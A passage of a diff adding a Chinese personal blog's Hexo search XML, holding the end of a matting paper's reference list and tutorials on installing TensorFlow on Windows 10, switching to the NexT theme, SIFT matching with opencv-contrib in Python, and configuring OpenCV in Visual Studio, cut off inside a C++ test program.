+<sup>15</sup>. B. He, G. Wang, C. Shi, X. Yin, B. Liu, and X. Lin. Iterative transductive learning for alpha matting. In <em>2013 IEEE International Conference on Image Processing</em>, pages 4282– 4286. IEEE, 2013. 6<a href="#reffn_15" title="Jump back to footnote [15] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_16">
+<sup>16</sup>. K. He, C. Rhemann, C. Rother, X. Tang, and J. Sun. A global sampling method for alpha matting. In <em>Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition</em>, 2011. 1, 2, 5, 7, 8<a href="#reffn_16" title="Jump back to footnote [16] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_17">
+<sup>17</sup>. K. He, J. Sun, and X. Tang. Guided image filtering. In <em>European conference on computer vision</em>, pages 1–14. Springer, 2010. 5, 6<a href="#reffn_17" title="Jump back to footnote [17] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_18">
+<sup>18</sup>. J. Johnson, E. S. Varnousfaderani, H. Cholakkal, , and D. Rajan. Sparse coding for alpha matting. <em>IEEE Transactions on Image Processing</em>, 2016. 2<a href="#reffn_18" title="Jump back to footnote [18] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_19">
+<sup>19</sup>. L. Karacan, A. Erdem, and E. Erdem. Image matting with kl-divergence based sparse sampling. In <em>Proceedings of the IEEE International Conference on Computer Vision</em>, pages 424–432, 2015. 2, 6<a href="#reffn_19" title="Jump back to footnote [19] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_20">
+<sup>20</sup>. D. Kingma and J. Ba. Adam: A method for stochastic optimization. <em>International Conference on Learning Representations</em>, 2015. 5<a href="#reffn_20" title="Jump back to footnote [20] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_21">
+<sup>21</sup>. P. Lee and Y. Wu. Nonlocal matting. <em>Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition</em>, 2011. 2<a href="#reffn_21" title="Jump back to footnote [21] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_22">
+<sup>22</sup>. A. Levin, D. Lischinski, and Y. Weiss. A closed-form solution to natural image matting. <em>IEEE Transactions on Pattern Analysis and Machine Intelligence</em>, 30(2):228–242, 2008. 1, 2, 5, 7, 8<a href="#reffn_22" title="Jump back to footnote [22] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_23">
+<sup>23</sup>. T.-Y. Lin, M. Maire, S. Belongie, J. Hays, P. Perona, D. Ramanan, P. Dollar, and C. L. Zitnick. Microsoft coco: Com-´ mon objects in context. In <em>European Conference on Computer Vision</em>, pages 740–755. Springer, 2014. 3<a href="#reffn_23" title="Jump back to footnote [23] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_24">
+<sup>24</sup>. D. Pathak, P. Krahenbuhl, J. Donahue, T. Darrell, and A. A. Efros. Context encoders: Feature learning by inpainting. In <em>The IEEE Conference on Computer Vision and Pattern Recognition (CVPR)</em>, June 2016. 3<a href="#reffn_24" title="Jump back to footnote [24] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_25">
+<sup>25</sup>. C. Rhemann, C. Rother, J. Wang, M. Gelautz, P. Kohli, and P. Rott. A perceptually motivated online benchmark for image matting. In <em>Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition</em>, 2009. 1, 2, 3, 5, 6<a href="#reffn_25" title="Jump back to footnote [25] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_26">
+<sup>26</sup>. E. Shahrian, B. Price, S. Cohen, and D. Rajan. Temporally coherent and spatially accurate video matting. In <em>Proceedings of Eurographics</em>, 2012. 3<a href="#reffn_26" title="Jump back to footnote [26] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_27">
+<sup>27</sup>. E. Shahrian and D. Rajan. Weighted color and texture sample selection for image matting. In <em>Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition</em>, 2012. 2<a href="#reffn_27" title="Jump back to footnote [27] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_28">
+<sup>28</sup>. E. Shahrian, D. Rajan, B. Price, and S. Cohen. Improving image matting using comprehensive sampling sets. In <em>Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition</em>, pages 636–643, 2013. 1, 2, 5, 7, 8<a href="#reffn_28" title="Jump back to footnote [28] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_29">
+<sup>29</sup>. X. Shen, X. Tao, H. Gao, C. Zhou, and J. Jia. Deep automatic portrait matting. In <em>Proceedings of the European Conference on Computer Vision</em>, 2016. 1, 2<a href="#reffn_29" title="Jump back to footnote [29] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_30">
+<sup>30</sup>. K. Simonyan and A. Zisserman. Very deep convolutional networks for large-scale image recognition. <em>CoRR</em>, abs/1409.1556, 2014. 4<a href="#reffn_30" title="Jump back to footnote [30] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_31">
+<sup>31</sup>. J. Sun, J. Jia, C.-K. Tang, and H.-Y. Shum. Poisson matting. In <em>ACM Transactions on Graphics (ToG)</em>, volume 23, pages 315–321. ACM, 2004. 1, 2<a href="#reffn_31" title="Jump back to footnote [31] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_32">
+<sup>32</sup>. J. Wang and M. F. Cohen. Optimized color sampling for robust matting. In <em>2007 IEEE Conference on Computer Vision and Pattern Recognition</em>, pages 1–8. IEEE, 2007. 1, 2<a href="#reffn_32" title="Jump back to footnote [32] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_33">
+<sup>33</sup>. J. Yang, B. Price, S. Cohen, H. Lee, and M.-H. Yang. Object contour detection with a fully convolutional encoder-decoder network. <em>Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition</em>, 2016. 3<a href="#reffn_33" title="Jump back to footnote [33] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_34">
+<sup>34</sup>. Y. Zheng and C. Kambhamettu. Learning based digital matting. In <em>2009 IEEE 12th International Conference on Computer Vision</em>, pages 889–896. IEEE, 2009. 5, 7, 8<a href="#reffn_34" title="Jump back to footnote [34] in the text."> &#8617;</a>
+</blockquote>
+<hr>
+<p>由于单个图片排版较繁琐，方便起见直接从原论文截取图片，见谅。后面会研究下怎么能比较好的排版。</p>
+]]></content>
+      
+        <categories>
+            
+            <category> 译文 </category>
+            
+            <category> CV </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 深度抠图 </tag>
+            
+            <tag> 论文 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Windows 10 安装 TensorFlow]]></title>
+      <url>https://blog.yanggang.cool/2019/03/03/Windows-10-%E5%AE%89%E8%A3%85-TensorFlow/</url>
+      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本文针对 Windows 10 下 TensorFlow 的安装提供一些经验（包含 CPU 版及 GPU 版）。</p>
+<a id="more"></a>
+<h2 id="TensorFlow-CPU-版本安装"><a href="#TensorFlow-CPU-版本安装" class="headerlink" title="TensorFlow CPU 版本安装"></a>TensorFlow CPU 版本安装</h2><p>基本软件需求：</p>
+<ul>
+<li><a href="https://www.python.org/downloads/windows/" target="_blank" rel="noopener">Python 3.6.*</a>：安装时记得勾选 “ADD TO PATH”</li>
+</ul>
+<p>安装：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --user --upgrade tensorflow</span><br></pre></td></tr></table></figure>
+<p>验证：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"import tensorflow as tf; tf.enable_eager_execution(); print(tf.reduce_sum(tf.random_normal([1000, 1000])))"</span></span><br></pre></td></tr></table></figure>
+<h2 id="TensorFlow-GPU-版本安装"><a href="#TensorFlow-GPU-版本安装" class="headerlink" title="TensorFlow GPU 版本安装"></a>TensorFlow GPU 版本安装</h2><p>基本软件需求：</p>
+<ul>
+<li><a href="https://www.python.org/downloads/windows/" target="_blank" rel="noopener">Python 3.6.*</a> ：安装时记得勾选 “ADD TO PATH”</li>
+<li><a href="https://visualstudio.microsoft.com/vs/community/" target="_blank" rel="noopener">Visual Studio</a></li>
+<li><a href="https://www.nvidia.com/drivers" target="_blank" rel="noopener">NVIDIA® GPU drivers</a> ：CUDA 9.0 要求驱动版本为 384.x 或更高。</li>
+<li><a href="https://developer.nvidia.com/cuda-zone" target="_blank" rel="noopener">CUDA® Toolkit</a> ：TensorFlow 支持 CUDA 9.0.</li>
+<li><a href="http://docs.nvidia.com/cuda/cupti/" target="_blank" rel="noopener">CUPTI</a> ：包含在 CUDA Toolkit 中。</li>
+<li><a href="https://developer.nvidia.com/cudnn" target="_blank" rel="noopener">cuDNN SDK</a> ：(&gt;= 7.2)</li>
+<li><em>(可选)</em> <a href="https://developer.nvidia.com/nccl" target="_blank" rel="noopener">NCCL 2.2</a> ：用于多 GPU 支持（因为个人设备限制，本文不作介绍）</li>
+<li><em>(可选)</em> <a href="https://docs.nvidia.com/deeplearning/sdk/tensorrt-install-guide/index.html" target="_blank" rel="noopener">TensorRT 4.0</a> ：在某些模型上改进延迟和吞吐量以进行推理（机翻，本文亦不作介绍）</li>
+</ul>
+<p>因为 <a href="https://developer.nvidia.com/cuda-zone" target="_blank" rel="noopener">CUDA® Toolkit</a> 中包含 GPU 驱动，因此省去 GPU 安装介绍。</p>
+<h3 id="Visual-Studio-安装"><a href="#Visual-Studio-安装" class="headerlink" title="Visual Studio 安装"></a>Visual Studio 安装</h3><p><a href="https://blog.samuelyg.cn/2018/04/28/OpenCV-%E5%9C%A8-Visual-Studio-%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/#Visual-Studio-%E7%9A%84%E5%AE%89%E8%A3%85" target="_blank" rel="noopener">Visual Studio 安装</a></p>
+<h3 id="CUDA-安装"><a href="#CUDA-安装" class="headerlink" title="CUDA 安装"></a>CUDA 安装</h3><p><a href="https://developer.nvidia.com/cuda-90-download-archive?target_os=Windows&amp;target_arch=x86_64&amp;target_version=10&amp;target_type=exelocal" target="_blank" rel="noopener">CUDA 9.0 下载链接</a></p>
+<p>下载完成，双击根据提示进行安装。</p>
+<p>程序应该会自动添加仅环境变量。</p>
+<h3 id="cuDNN-安装"><a href="#cuDNN-安装" class="headerlink" title="cuDNN 安装"></a>cuDNN 安装</h3><p><a href="https://developer.nvidia.com/rdp/cudnn-download" target="_blank" rel="noopener">cuDNN 下载链接</a></p>
+<ul>
+<li>选择 “I Agree To the Terms of the cuDNN Software License Agreement”</li>
+<li>选择 “Download cuDNN v7.5.0 (Feb 21, 2019), for CUDA 9.0”</li>
+<li>点击 “cuDNN Library for Windows 10” ，下载</li>
+<li>将下载好的文件解压缩到某一路径</li>
+<li>将 <code>*/cuda/bin</code> <code>*/cuda/include</code> <code>*/cuda/lib/x64</code> 三个文件夹添加到环境变量</li>
+</ul>
+<h3 id="tensorflow-gpu-安装"><a href="#tensorflow-gpu-安装" class="headerlink" title="tensorflow-gpu 安装"></a>tensorflow-gpu 安装</h3><p>安装：</p>
+<p>因为直接安装的话默认会安装 <code>tensorflow-gpu 1.13.*</code> ，但是貌似兼容性会有问题，在使用时会出错，所以我们选择安装 1.12 版本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --ignore-installed --upgrade tensorflow-gpu==<span class="number">1.12</span></span><br></pre></td></tr></table></figure>
+<p>验证：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line">hello = tf.constant(<span class="string">"hello tensorflow"</span>)</span><br><span class="line"><span class="keyword">with</span> tf.Session() <span class="keyword">as</span> sess:</span><br><span class="line">    print(sess.run(hello))</span><br></pre></td></tr></table></figure>
+<p>从运行结果中，也可以很明显的看出程序使用了 GPU 资源。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://tensorflow.google.cn/install" target="_blank" rel="noopener">tensorflow install</a></p>
+<p><a href="https://github.com/jvishnuvardhan/Installing-TensorFlow-GPU-on-Windows-10-TF1.12" target="_blank" rel="noopener">jvishnuvardhan’s Installing-TensorFlow-GPU-on-Windows-10-TF1.12</a></p>
+<p><a href="https://tensorflow.google.cn/install/source_windows#tested_build_configurations" target="_blank" rel="noopener">官方经过测试的配置</a></p>
+<h2 id="一些经验"><a href="#一些经验" class="headerlink" title="一些经验"></a>一些经验</h2><p>虽然现在 GPU 内存都很大了，但不少人难免还在使用相对落后的笔记本电脑（比如我），可能 GPU 内存只有 2G ，这就会造成很多因为配置产生的问题。一个简单的例子就是 在运行 mnist 数据集的测试集时，会因为需要的内存较大而在一些显卡上无法运行。可以参考 <a href="https://github.com/tensorflow/tensorflow/issues/136" target="_blank" rel="noopener">ResourceExhaustedError in CNN/MNIST example (with GPU) #136</a> 和 <a href="https://github.com/tensorflow/tensorflow/pull/6764" target="_blank" rel="noopener">MNIST batch test #6764</a> ，其中提到了这个问题，并提供了解决办法，但是官方并为采纳。</p>
+<p>所以，各位是安装 CPU 版还是 GPU 版还需根据自己电脑配置来斟酌。</p>
+<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>部分链接在中国大陆或某些运营商宽度下可能速度较慢或无法访问，请自备科学上网工具以方便下载。</p>
+<p>如有问题，请在科学上网前提下在评论中说明/指正。</p>
+]]></content>
+      
+        <categories>
+            
+            <category> TensorFlow </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> TensorFlow </tag>
+            
+            <tag> Windows10 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[主题更换纪]]></title>
+      <url>https://blog.yanggang.cool/2018/12/29/%E4%B8%BB%E9%A2%98%E6%9B%B4%E6%8D%A2%E7%BA%AA/</url>
+      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>原本使用的 <a href="https://github.com/viosey/hexo-theme-material" target="_blank" rel="noopener">Material Theme</a> 这两日使用起来很不舒服，页面滚动起来竟然会有些掉帧。于是就想着换个主题用用。由于心水 <a href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="noopener">NexT</a> 已久，所以就着手更换了。</p>
+<a id="more"></a>
+<p>参考<a href="git clone https://github.com/iissnan/hexo-theme-next themes/next">主题文档</a>。</p>
+<h2 id="安装并启用-NexT"><a href="#安装并启用-NexT" class="headerlink" title="安装并启用 NexT"></a>安装并启用 NexT</h2><h3 id="下载主题"><a href="#下载主题" class="headerlink" title="下载主题"></a>下载主题</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd bolg</span><br><span class="line">git clone https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>
+<h3 id="启用主题"><a href="#启用主题" class="headerlink" title="启用主题"></a>启用主题</h3><p>打开站点根目录下 <code>_config.yml</code> 配置文件，编辑：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theme: next</span><br></pre></td></tr></table></figure>
+<p>此时网站语言可能是英文，因为旧的主题语言设置可能与此主题不同，所以设置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">language: zh-Hans</span><br></pre></td></tr></table></figure>
+<p>接着就看一下我们的新主题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure>
+<p>根据提示在浏览器打开 <code>http://localhost:4000</code> 即可见到新主题芳容。</p>
+<p>但总感觉哪里有些不对劲，所以需要继续进行配置。</p>
+<h2 id="主题设置"><a href="#主题设置" class="headerlink" title="主题设置"></a>主题设置</h2><h3 id="选择-Scheme"><a href="#选择-Scheme" class="headerlink" title="选择 Scheme"></a>选择 Scheme</h3><p>打开主题目录下 <code>_config.yml</code> 配置文件，更改：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme: Pisces</span><br></pre></td></tr></table></figure>
+<p>这个是双栏模式，个人比较喜欢，其他可以查看文首链接。</p>
+<h3 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h3><p><code>menu</code> 下有多项设置可选，看需求设置就好。</p>
+<p>如需自定页面，还需按需添加翻译信息（文件位置 <code>languages/{language}.yml</code>）</p>
+<p>以上设置完成差不多就可以 deploy 了，其他细节慢慢添加。</p>
+]]></content>
+      
+        <categories>
+            
+            <category> 闲杂 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 日志 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[安装 opencv-contrib 做 SIFT 特征匹配(Python)]]></title>
+      <url>https://blog.yanggang.cool/2018/06/05/Ubuntu-%E4%B8%8B%E5%AE%89%E8%A3%85-opencv-contrib-%E5%81%9A-SIFT-%E7%89%B9%E5%BE%81%E5%8C%B9%E9%85%8D-Python/</url>
+      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>因为 SIFT 算法的授权问题，导致 OpenCV 有两个版本，即如需使用 SIFT 算法就必须要用 OpenCV-contrib ，但是 VS2017 里配置 OpenCV-contrib 比较繁琐，使用 Python 就会方便很多。</p>
+<a id="more"></a>
+<p>Windows 下也可使用此方法，步骤大都如下，仅更改了标题，其余未作变动。</p>
+<p>本文所使用环境：</p>
+<ul>
+<li>Ubuntu 16.04 LTS / Windows</li>
+<li>Python 2.7</li>
+</ul>
+<h2 id="安装-opencv-contrib"><a href="#安装-opencv-contrib" class="headerlink" title="安装 opencv-contrib"></a>安装 opencv-contrib</h2><ul>
+<li><p>先安装 pip 软件包管理系统</p>
+<ul>
+<li><p>打开一个 Terminal (快捷键 <code>ctrl + alt + t</code> )</p>
+</li>
+<li><p>输入以下命令后回车，按提示操作</p>
+</li>
+</ul>
+<p><code>sudo apt-get install python-pip</code></p>
+</li>
+<li><p>安装 OpenCV-contrib</p>
+</li>
+</ul>
+<p>Terminal 中输入以下命令，等待提示完成即可</p>
+<p><code>pip install opencv-contrib-python</code></p>
+<ul>
+<li>验证</li>
+</ul>
+<p>Terminal 中执行以下命令验证是否安装成功</p>
+<p><code>$ python</code></p>
+<p><code>import cv2 as cv</code></p>
+<p><code>print(cv.__version__)</code></p>
+<p>安装成功会输出当前版本号</p>
+<h2 id="SIFT-特征匹配"><a href="#SIFT-特征匹配" class="headerlink" title="SIFT 特征匹配"></a>SIFT 特征匹配</h2><ul>
+<li><p>代码</p>
+<pre><code>#sift feature
+import cv2
+import numpy as np
+MIN_MATCH_COUNT = 4
+imgname1 = &quot;1.jpg&quot;
+imgname2 = &quot;2.jpg&quot;
+## (1) prepare data
+img1 = cv2.imread(imgname1)
+img2 = cv2.imread(imgname2)
+gray1 = cv2.cvtColor(img1, cv2.COLOR_BGR2GRAY)
+gray2 = cv2.cvtColor(img2, cv2.COLOR_BGR2GRAY)
+## (2) Create SIFT object
+sift = cv2.xfeatures2d.SIFT_create()
+## (3) Create flann matcher
+matcher = cv2.FlannBasedMatcher(dict(algorithm = 1, trees = 5), {})
+## (4) Detect keypoints and compute keypointer descriptors
+kpts1, descs1 = sift.detectAndCompute(gray1,None)
+kpts2, descs2 = sift.detectAndCompute(gray2,None)
+## (5) knnMatch to get Top2
+matches = matcher.knnMatch(descs1, descs2, 2)
+# Sort by their distance.
+matches = sorted(matches, key = lambda x:x[0].distance)
+## (6) Ratio test, to get good matches.
+good = [m1 for (m1, m2) in matches if m1.distance &amp;lt; 0.7 * m2.distance]
+canvas = img2.copy()
+## (7) find homography matrix
+if len(good)&amp;gt;MIN_MATCH_COUNT:
+    ## (queryIndex for the small object, trainIndex for the scene )
+    src_pts = np.float32([ kpts1[m.queryIdx].pt for m in good ]).reshape(-1,1,2)
+    dst_pts = np.float32([ kpts2[m.trainIdx].pt for m in good ]).reshape(-1,1,2)
+    ## find homography matrix in cv2.RANSAC using good match points
+    M, mask = cv2.findHomography(src_pts, dst_pts, cv2.RANSAC,5.0)
+    #matchesMask2 = mask.ravel().tolist()
+    h,w = img1.shape[:2]
+    pts = np.float32([ [0,0],[0,h-1],[w-1,h-1],[w-1,0] ]).reshape(-1,1,2)
+    dst = cv2.perspectiveTransform(pts,M)
+    cv2.polylines(canvas,[np.int32(dst)],True,(0,255,0),3, cv2.LINE_AA)
+else:
+    print( &quot;Not enough matches are found - {}/{}&quot;.format(len(good),MIN_MATCH_COUNT))
+## (8) drawMatches
+matched = cv2.drawMatches(img1,kpts1,canvas,kpts2,good,None)#,**draw_params)
+## (9) Crop the matched region from scene
+h,w = img1.shape[:2]
+pts = np.float32([ [0,0],[0,h-1],[w-1,h-1],[w-1,0] ]).reshape(-1,1,2)
+dst = cv2.perspectiveTransform(pts,M)
+perspectiveM = cv2.getPerspectiveTransform(np.float32(dst),pts)
+found = cv2.warpPerspective(img2,perspectiveM,(w,h))
+## (10) save and display
+cv2.imwrite(&quot;matched.png&quot;, matched)
+cv2.imwrite(&quot;found.png&quot;, found)
+cv2.imshow(&quot;matched&quot;, matched);
+#cv2.imshow(&quot;found&quot;, found);
+cv2.waitKey();cv2.destroyAllWindows()
+</code></pre></li>
+</ul>
+<p>原始图像：</p>
+<p><a href="https://miao.su/image/w8eD7" target="_blank" rel="noopener"><img src="https://miao.su/images/2018/05/02/1e043b.md.jpg" alt="1e043b.md.jpg"></a></p>
+<p><a href="https://miao.su/image/w83a5" target="_blank" rel="noopener"><img src="https://miao.su/images/2018/05/02/2c0118.md.jpg" alt="2c0118.md.jpg"></a></p>
+<p>匹配结果：</p>
+<p><img src="https://miao.su/images/2018/05/02/3346ac.jpg" alt="3346ac.jpg"></p>
+]]></content>
+      
+        <categories>
+            
+            <category> OpenCV </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> OpenCV </tag>
+            
+            <tag> Python </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[OpenCV 在 Visual Studio 中的使用]]></title>
+      <url>https://blog.yanggang.cool/2018/04/28/OpenCV-%E5%9C%A8-Visual-Studio-%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本文介绍了 VS2017 中配置 OpenCV 的方法。</p>
+<a id="more"></a>
+<p>因为 nonfree 的算法问题，重写部分内容，文中图片暂不更换，文件名及路径以文字为准。</p>
+<p>PS: 文中理论上没有错误的地方了=￣ω￣=</p>
+<p>因为某些原因，阅读体验较差</p>
+<p>本文内容：    </p>
+<ul>
+<li>OpenCV 的安装</li>
+<li>Visual Studio 的安装</li>
+<li>VS 中配置 OpenCV</li>
+</ul>
+<p>所需环境及文件（仅供参考）：    </p>
+<ul>
+<li>Windows 10 64 bit</li>
+<li>opencv-2.4.13.6-vc14.exe</li>
+<li>Visual Studio 2017</li>
+</ul>
+<p>推荐使用 <code>OpenCV-2.*</code> 是因为可以更方便使用如 SIFT 等 nonfree 算法</p>
+<h2 id="OpenCV-的安装"><a href="#OpenCV-的安装" class="headerlink" title="OpenCV 的安装"></a>OpenCV 的安装</h2><ol>
+<li>下载<br>在 OpenCV 的 GitHub 的 <a href="https://github.com/opencv/opencv/releases" target="_blank" rel="noopener">Releases</a> 页面下载 <code>opencv-2.4.13.6-vc14.exe</code> 文件 （<a href="https://www.opencv.org/releases.html" target="_blank" rel="noopener">OpenCV</a> 此页面也可下载到）</li>
+<li>安装<br>上述下载的文件为自解压文件，双击后选择要解压的目录即可（本文直接解压到 C 盘，后续用到的路径根据自己解压的路径自行替换）</li>
+<li>添加环境变量<br>右键此电脑 –&gt; 属性 –&gt; 高级系统设置 –&gt; 环境变量<br>编辑系统变量的 Path 变量，添加 <code>C:\opencv\build\x64\vc14\bin</code> 此路径</li>
+</ol>
+<h2 id="Visual-Studio-的安装"><a href="#Visual-Studio-的安装" class="headerlink" title="Visual Studio 的安装"></a>Visual Studio 的安装</h2><ol>
+<li>下载<br>进入官方<a href="https://www.visualstudio.com/zh-hans/downloads/" target="_blank" rel="noopener">下载</a>页面下载 Visual Studio Community 2017 版本 （确保你有微软账号，软件需要登陆，不登陆可能会有使用时间限制）</li>
+<li>安装<br>打开刚下载的软件，等待些许时间会进入 Visual Studio Installer , 选择 Visual Studio Community 2017 安装，接下来我们选择要安装的环境（本文选择 c++ ）如下图    (此处需要注意，C 盘务必保留充足空间，即使更换了安装位置还是要占用 C 盘部分空间)<br><img src="https://miao.su/images/2018/04/26/vs_install14beb.png" alt="vs_install14beb.png"></li>
+</ol>
+<p>接下来等待安装程序自动下载安装，时间长短依赖个人网速及电脑性能</p>
+<h2 id="VS-中配置-OpenCV"><a href="#VS-中配置-OpenCV" class="headerlink" title="VS 中配置 OpenCV"></a>VS 中配置 OpenCV</h2><p>大致需要三个步骤：</p>
+<ul>
+<li>编译器添加 include 路径</li>
+<li>编译器添加 lib 路径</li>
+<li>编译器添加 lib 文件</li>
+</ul>
+<ol>
+<li>新建一个空/控制台项目<br><img src="https://miao.su/images/2018/04/26/create8e7cd.png" alt="create8e7cd.png"></li>
+<li>添加一个源文件<br><img src="https://miao.su/images/2018/04/26/new_file20a5b.png" alt="new_file20a5b.png"><br><img src="https://miao.su/images/2018/04/26/new_file_2b4733.png" alt="new_file_2b4733.png"></li>
+<li>配置 OpenCV 并运行测试代码</li>
+</ol>
+<ul>
+<li>配置</li>
+</ul>
+<p>红框处按图片上设置然后在新建的项目上右键然后选择属性</p>
+<p><img src="https://miao.su/images/2018/04/27/setting47ecf.png" alt="setting47ecf.png"></p>
+<p>添加 <code>C:\opencv\build\include</code> 路径，注意红框处</p>
+<p><img src="https://miao.su/images/2018/04/27/set1c0bf0.png" alt="set1c0bf0.png"></p>
+<p>添加 <code>C:\opencv\build\x64\vc14\lib</code> 路径</p>
+<p><img src="https://miao.su/images/2018/04/27/set2fd47e.png" alt="set2fd47e.png"></p>
+<p>添加 <code>opencv_ml2413d.lib</code><br><code>opencv_calib3d2413d.lib</code><br><code>opencv_contrib2413d.lib</code><br><code>opencv_core2413d.lib</code><br><code>opencv_features2d2413d.lib</code><br><code>opencv_flann2413d.lib</code><br><code>opencv_gpu2413d.lib</code><br><code>opencv_highgui2413d.lib</code><br><code>opencv_imgproc2413d.lib</code><br><code>opencv_legacy2413d.lib</code><br><code>opencv_objdetect2413d.lib</code><br><code>opencv_ts2413d.lib</code><br><code>opencv_video2413d.lib</code><br><code>opencv_nonfree2413d.lib</code><br><code>opencv_ocl2413d.lib</code><br><code>opencv_photo2413d.lib</code><br><code>opencv_stitching2413d.lib</code><br><code>opencv_superres2413d.lib</code><br><code>opencv_videostab2413d.lib</code><br>这些库文件，Release mod 删除后缀前的 <code>d</code> 即可，其他版本根据具体版本修改每个文件中的数字（即版本号）</p>
+<p><img src="https://miao.su/images/2018/04/27/set3b23e4.png" alt="set3b23e4.png">    </p>
+<ul>
+<li>测试代码</li>
+</ul>
+<p>将代码 copy 到刚刚新建的源文件并保存</p>
+<pre><code>    /**********************************************************
+    Name :
+    Date : 2016/05/29
+    By   : CharlotteHonG
+    Final: 2016/05/29
+    **********************************************************/
+    #include &amp;lt;iostream&amp;gt;
+    #include &amp;lt;opencv2/opencv.hpp&amp;gt;
+
+    using namespace cv;
+
+    int main(int argc, char const *argv[]) {
+    /* 畫布 */
+    Mat img(270, 720, CV_8UC3, Scalar(56, 50, 38));
+    /* 直線 */
+    line(img, Point(20, 40), Point(120, 140), Scalar(255, 0, 0), 3);
+    /* 實心方塊 */
+    rectangle(img, Point(150, 40), Point(250, 140), Scalar(0, 0, 255), -1);
+    /* 實心圓 */
+    circle(img, Point(330, 90), 50, Scalar(0, 255, 0), -1);
+    /* 空心橢圓 */
+    ellipse(img, Point(460, 90), Size(60, 40), 45, 0, 360, Scalar(255, 255, 0), 2);
+    /* 不規則圖形 */
+    Point points[1][5];
+    int x = 40, y = 540;
+    points[0][0] = Point(0 + y, 50 + x);
+    points[0][1] = Point(40 + y, 0 + x);
+    points[0][2] = Point(110 + y, 35 + x);
+    points[0][3] = Point(74 + y, 76 + x);
+    points[0][4] = Point(28 + y, 96 + x);
+    const Point* ppt[1] = { points[0] };
+    int npt[] = { 5 };
+    polylines(img, ppt, npt, 1, 1, Scalar(0, 255, 255), 3);
+    /* 繪出文字 */
+    putText(img, &quot;Test Passed !!&quot;, Point(10, 230), 0, 3, Scalar(255, 170, 130), 3);
+    /* 開啟畫布 */
+    namedWindow(&quot;OpenCV Test By:Charlotte.HonG&quot;, WINDOW_AUTOSIZE);
+    imshow(&quot;OpenCV Test By:Charlotte.HonG&quot;, img);
+    waitKey(0);
